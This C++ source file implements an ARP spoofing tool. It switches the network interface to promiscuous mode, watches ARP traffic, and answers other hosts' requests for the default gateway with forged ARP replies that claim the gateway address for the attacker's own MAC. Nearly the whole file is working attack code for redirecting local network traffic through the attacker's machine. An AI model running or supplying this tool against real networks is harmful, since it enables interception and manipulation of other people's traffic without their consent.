#include "ArpSpoofer.h"
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <iostream>
#include <linux/if_packet.h>

using std::cout;
using std::endl;


ArpSpoofer::ArpSpoofer() {

}

void ArpSpoofer::start_spoofing(char *interface, uint8_t* gateway) {
    struct ifreq ifr;
    struct sockaddr_ll sall;
    struct ethhdr *frame_head;
    struct arphdr_ex * arpHeader;
    socklen_t sl;
    char frame_content[ETH_FRAME_LEN];

    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_t *libnet_context;

    int sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ioctl(sfd, SIOCGIFFLAGS, &ifr); // GET
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(sfd, SIOCSIFFLAGS, &ifr); // SET

    libnet_context = libnet_init(LIBNET_LINK, NULL, err_buf);
    uint32_t my_ip = libnet_get_ipaddr4(libnet_context);
    libnet_ether_addr *my_mac = libnet_get_hwaddr(libnet_context);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wmissing-noreturn"
    while(666){
        memset(frame_content, 0, ETH_FRAME_LEN);
        sl = sizeof(struct sockaddr_ll);
        recvfrom(sfd, frame_content, ETH_FRAME_LEN, 0, (struct sockaddr *) &sall, &sl);
        frame_head = (struct ethhdr *) frame_content;
        if((ntohs(frame_head->h_proto) & 0xFFFFU) == ARP_ETHER_TYPE) {
            arpHeader = (struct arphdr_ex *)(frame_content + sizeof(struct ethhdr));

            cout << getArpOption(ntohs((uint16_t)arpHeader->option)) << endl
                 << "  sender " << ipToString(arpHeader->sender_ip) << " [" << macToString(arpHeader->sender_mac)
                 << "] \n  target " << ipToString(arpHeader->target_ip) << " [" << macToString(arpHeader->target_mac)
                 << "]" << endl;

            bool macFlag = true;
            for(int i = 0; i < 6; i++) {
                if(arpHeader->target_mac[i] != EMPTY_MAC[i]){
                    macFlag = false;
                    break;
                }
            }

            if(macFlag && ipToInt(DEFAULT_GATEWAY_IP) == ipToInt(arpHeader->target_ip)
               && (my_ip != ipToInt(arpHeader->sender_ip))) {
                cout << "Someone requesting gateway!!!" << endl;

                libnet_ptag_t arp = 0, eth = 0;

                arp = libnet_autobuild_arp(
                        ARPOP_REPLY,
                        my_mac->ether_addr_octet,
                        DEFAULT_GATEWAY_IP,
                        arpHeader->sender_mac,
                        arpHeader->sender_ip,
                        libnet_context
                );

                if(arp == -1){
                    cout << "arp error: " << libnet_geterror(libnet_context) << endl;
                }

                eth = libnet_autobuild_ethernet(
                        BROADCAST_MAC,
                        ARP_ETHER_TYPE,
                        libnet_context
                );

                if(eth == -1){
                    cout << "eth error: " << libnet_geterror(libnet_context) << endl;
                }

                if ((libnet_write (libnet_context)) == -1) {
                    cout << "error on sending arp packet: " << libnet_geterror (libnet_context);
                }

                libnet_clear_packet (libnet_context);

            }

            cout << endl;
        }
    }
#pragma clang diagnostic pop
}

const char *ArpSpoofer::getArpOption(const uint16_t optionCode) {
    switch(optionCode){
        case ARPOP_REPLY:
            return "REPLY";
        case ARPOP_REQUEST:
            return "REQUEST";
        default: return "OTHER";
    }
}

const char *ArpSpoofer::macToString(const uint8_t *mac) {
    char *s = new char[18];
    sprintf(s, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return s;
}

const char *ArpSpoofer::ipToString(const uint8_t *ip) {
    char *s = new char[16];
    sprintf(s, "%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3]);
    return s;
}

const uint32_t ArpSpoofer::ipToInt(const uint8_t *ip){
    uint32_t res = (ip[3] << 24) | (ip[2] << 16) | (ip[1] << 8) | ip[0];
    return res;
}
